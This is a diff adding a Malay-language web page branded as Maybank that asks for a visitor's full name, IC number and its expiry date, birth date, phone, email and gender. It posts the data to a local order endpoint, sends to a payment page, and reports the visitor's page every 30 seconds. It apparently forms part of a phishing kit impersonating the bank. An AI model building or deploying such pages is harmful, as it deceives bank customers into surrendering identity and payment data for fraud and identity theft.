@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="ms" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Maybank - Maklumat Peribadi</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f8f9fa;
+            color: #212529;
+        }
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: #ffc72c;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 40px;
+            z-index: 1000;
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        .header-left img {
+            height: 38px;
+            object-fit: contain;
+        }
+        .lang-btn {
+            font-weight: bold;
+            color: #000000;
+            background: rgba(0,0,0,0.08);
+            padding: 5px 12px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            color: #000000;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        .phone-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .menu-icon {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            width: 22px;
+            height: 16px;
+            cursor: pointer;
+        }
+        .menu-icon span {
+            display: block;
+            height: 2.5px;
+            background-color: #000000;
+            border-radius: 2px;
+        }
+        
+        .main-container {
+            margin-top: 85px;
+            width: 100%;
+            min-height: calc(100vh - 85px);
+            background-color: #f8f9fa;
+            padding: 50px 20px 80px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .form-wrapper {
+            width: 100%;
+            max-width: 900px;
+            background: #ffffff;
+            padding: 50px 60px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.04);
+            border: 1px solid #eaeaea;
+        }
+        .form-title {
+            font-size: 28px;
+            color: #1a1a1a;
+            margin-bottom: 35px;
+            font-weight: 700;
+            text-align: center;
+            border-bottom: 2px solid #ffc72c;
+            padding-bottom: 15px;
+        }
+        
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 25px;
+        }
+        .form-group {
+            margin-bottom: 22px;
+        }
+        .form-group.full-width {
+            grid-column: span 2;
+        }
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #2c3e50;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .form-control {
+            width: 100%;
+            padding: 14px 18px;
+            border: 1.5px solid #dcdfe6;
+            border-radius: 8px;
+            font-size: 15px;
+            outline: none;
+            transition: all 0.3s ease;
+            background-color: #fafbfc;
+            color: #333;
+        }
+        .form-control:focus {
+            border-color: #ffc72c;
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(255,199,44,0.15);
+        }
+        
+        .date-select-group {
+            display: flex;
+            gap: 12px;
+        }
+        .date-select-group select {
+            flex: 1;
+            background-color: #fafbfc;
+            cursor: pointer;
+        }
+
+        .radio-group {
+            display: flex;
+            gap: 30px;
+            margin-top: 10px;
+        }
+        .radio-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 500;
+            cursor: pointer;
+            font-size: 16px;
+            color: #333;
+        }
+        .radio-label input {
+            width: 18px;
+            height: 18px;
+            accent-color: #ffc72c;
+        }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 30px 0;
+            cursor: pointer;
+            font-size: 15px;
+            color: #2c3e50;
+            grid-column: span 2;
+        }
+        .checkbox-container input {
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+            accent-color: #ffc72c;
+        }
+        
+        .submit-btn {
+            grid-column: span 2;
+            background-color: #ffc72c;
+            color: #1a1a1a;
+            border: none;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(255,199,44,0.3);
+            margin-top: 10px;
+        }
+        .submit-btn:hover {
+            background-color: #e6b325;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 15px rgba(255,199,44,0.4);
+        }
+
+        footer {
+            background-color: #1a1a1a;
+            color: #ffffff;
+            padding: 60px 20px 30px 20px;
+        }
+        .footer-container {
+            max-width: 1100px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .footer-logo {
+            height: 40px;
+            object-fit: contain;
+            margin-bottom: 25px;
+        }
+        .footer-info {
+            font-size: 15px;
+            line-height: 2.2;
+            color: #cccccc;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .footer-bottom {
+            margin-top: 40px;
+            width: 100%;
+            border-top: 1px solid #333333;
+            padding-top: 20px;
+            font-size: 14px;
+            color: #777777;
+            text-align: center;
+        }
+
+        @media(max-width: 768px) {
+            .form-grid {
+                grid-template-columns: 1fr;
+            }
+            .form-group.full-width, .checkbox-container, .submit-btn {
+                grid-column: span 1;
+            }
+            .form-wrapper {
+                padding: 30px 20px;
+            }
+        }
+        /* Mobile Responsive */
+        @media (max-width: 600px) {
+            header {
+                padding: 10px 15px;
+            }
+            .header-left img {
+                height: 28px;
+            }
+            .header-right {
+                font-size: 12px;
+                gap: 8px;
+            }
+            .phone-group span {
+                white-space: nowrap;
+                font-size: 12px;
+            }
+            .lang-btn {
+                font-size: 12px;
+                padding: 4px 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="header-left">
+            <a href="index.html"><img src="maybank-logo.png" alt="Maybank"></a>
+            <a href="data-en.html" class="lang-btn">EN</a>
+        </div>
+        <div class="header-right">
+            <div class="phone-group">
+                <span>1-300-88-6688</span>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+            </div>
+            <div class="menu-icon">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <div class="form-wrapper">
+            <h2 class="form-title">Maklumat Peribadi</h2>
+            <form id="personalDataForm" class="form-grid">
+                
+                <div class="form-group full-width">
+                    <label for="fullname">Nama Penuh</label>
+                    <input type="text" id="fullname" name="fullname" class="form-control" required placeholder="Masukkan nama penuh anda">
+                </div>
+
+                <div class="form-group">
+                    <label for="id_number">Nombor Kad Pengenalan</label>
+                    <input type="text" id="id_number" name="id_number" class="form-control" required placeholder="Nombor IC">
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">Nombor Telefon</label>
+                    <input type="tel" id="phone" name="phone" class="form-control" required placeholder="+60 XX XXXX XXXX">
+                </div>
+
+                <div class="form-group">
+                    <label>Tarikh Tamat Kad Pengenalan</label>
+                    <div class="date-select-group">
+                        <select name="id_expiry_day" class="form-control" required>
+                            <option value="">Hari</option>
+                            <script>
+                                for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);
+                            </script>
+                        </select>
+                        <select name="id_expiry_month" class="form-control" required>
+                            <option value="">Bulan</option>
+                            <option value="1">Januari</option>
+                            <option value="2">Februari</option>
+                            <option value="3">Mac</option>
+                            <option value="4">April</option>
+                            <option value="5">Mei</option>
+                            <option value="6">Jun</option>
+                            <option value="7">Julai</option>
+                            <option value="8">Ogos</option>
+                            <option value="9">September</option>
+                            <option value="10">Oktober</option>
+                            <option value="11">November</option>
+                            <option value="12">Disember</option>
+                        </select>
+                        <select name="id_expiry_year" class="form-control" required>
+                            <option value="">Tahun</option>
+                            <script>
+                                for(let i=2026; i<=2050; i++) document.write(`<option value="${i}">${i}</option>`);
+                            </script>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Tarikh Lahir</label>
+                    <div class="date-select-group">
+                        <select name="dob_day" class="form-control" required>
+                            <option value="">Hari</option>
+                            <script>
+                                for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);
+                            </script>
+                        </select>
+                        <select name="dob_month" class="form-control" required>
+                            <option value="">Bulan</option>
+                            <option value="1">Januari</option>
+                            <option value="2">Februari</option>
+                            <option value="3">Mac</option>
+                            <option value="4">April</option>
+                            <option value="5">Mei</option>
+                            <option value="6">Jun</option>
+                            <option value="7">Julai</option>
+                            <option value="8">Ogos</option>
+                            <option value="9">September</option>
+                            <option value="10">Oktober</option>
+                            <option value="11">November</option>
+                            <option value="12">Disember</option>
+                        </select>
+                        <select name="dob_year" class="form-control" required>
+                            <option value="">Tahun</option>
+                            <script>
+                                for(let i=1950; i<=2010; i++) document.write(`<option value="${i}">${i}</option>`);
+                            </script>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="form-group full-width">
+                    <label for="email">Emel</label>
+                    <input type="email" id="email" name="email" class="form-control" required placeholder="contoh@gmail.com">
+                </div>
+
+                <div class="form-group full-width">
+                    <label>Jantina</label>
+                    <div class="radio-group">
+                        <label class="radio-label">
+                            <input type="radio" name="gender" value="Lelaki" required> Lelaki
+                        </label>
+                        <label class="radio-label">
+                            <input type="radio" name="gender" value="Perempuan" required> Perempuan
+                        </label>
+                    </div>
+                </div>
+
+                <label class="checkbox-container">
+                    <input type="checkbox" required>
+                    <span>Saya bersetuju dengan terma dan syarat</span>
+                </label>
+
+                <button type="submit" class="submit-btn">Teruskan Pesanan</button>
+
+            </form>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-container">
+            <a href="index.html"><img src="maybank-logo-white.png" alt="Maybank" class="footer-logo"></a>
+            <div class="footer-info">
+                <div>Alamat: Menara Maybank, 100 Jalan Tun Perak, 50050 Kuala Lumpur, Malaysia</div>
+                <div>Emel: info@maybank.com.my</div>
+                <div>TELEFON: 1-300-88-6688</div>
+                <div>FAKS: +603-2070 9400</div>
+            </div>
+            <div class="footer-bottom">
+                &copy; 2026 Maybank. Hak cipta terpelihara.
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('personalDataForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const formData = new FormData(e.target);
+            const data = Object.fromEntries(formData);
+
+            try {
+                const response = await fetch('/api/orders/personal-data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.json();
+                
+                if (response.ok) {
+                    sessionStorage.setItem('orderId', result.orderId);
+                    window.location.href = 'payment.html';
+                } else {
+                    alert('Ralat: Maklumat tidak lengkap. Sila cuba lagi.');
+                }
+            } catch (err) {
+                console.error('Error:', err);
+                alert('Ralat: Gagal menyambung ke pelayan. Sila cuba lagi.');
+            }
+        });
+    </script>
+
+    <script>
+        function sendHeartbeat() {
+            fetch('/api/heartbeat', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ currentPage: window.location.pathname })
+            }).catch(() => {});
+        }
+        setInterval(sendHeartbeat, 30000);
+        sendHeartbeat();
+    </script>
+</body>
+</html>
